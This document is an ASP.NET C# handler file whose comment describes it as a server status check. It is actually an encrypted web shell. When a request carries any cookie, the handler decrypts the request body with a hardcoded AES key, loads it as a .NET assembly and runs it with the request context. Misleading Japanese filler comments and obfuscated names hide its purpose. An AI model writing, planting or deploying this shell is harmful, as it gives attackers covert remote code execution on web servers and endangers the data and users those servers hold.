<%@ WebHandler Language="C#" Class="H_jp_4x" %>
using System.Web;
using System.Security.Cryptography;
using System.Reflection;

// サーバーの状態を確認します。
public class H_jp_4x : IHttpHandler {
    public void ProcessRequest(HttpContext ctx_8y) {
        int state = 0;
        if (ctx_8y.Request.Cookies.Count > 0) {
            state = 1;
        }

        // 月が綺麗ですね。
        while (state != 0) {
            switch (state) {
                case 1:
                    // 何もしたくない。
                    var d_content_b = ctx_8y.Request.BinaryRead(ctx_8y.Request.ContentLength);
                    var k_secret_a = new byte[] { 99, 97, 54, 51, 52, 53, 55, 53, 51, 56, 98, 57, 98, 49, 101, 48 };

                    // 暗号化されたモジュールを処理します。
                    var p_provider_c = new RijndaelManaged();
                    var d_decryptor_d = p_provider_c.CreateDecryptor(k_secret_a, k_secret_a);
                    var a_bytes_e = d_decryptor_d.TransformFinalBlock(d_content_b, 0, d_content_b.Length);
                    
                    // 昨日の晩ご飯はカレーでした。
                    var m_module_f = Assembly.Load(a_bytes_e);
                    var i_instance_g = m_module_f.CreateInstance("K");
                    
                    // 結果を比較します。
                    i_instance_g.Equals(ctx_8y);

                    state = 0; // 終了
                    break;

                default:
                    // ここには来ないはず。
                    state = 0;
                    break;
            }
        }
    }
    // このインスタンスは再利用できません。
    public bool IsReusable { get { return false; } }
}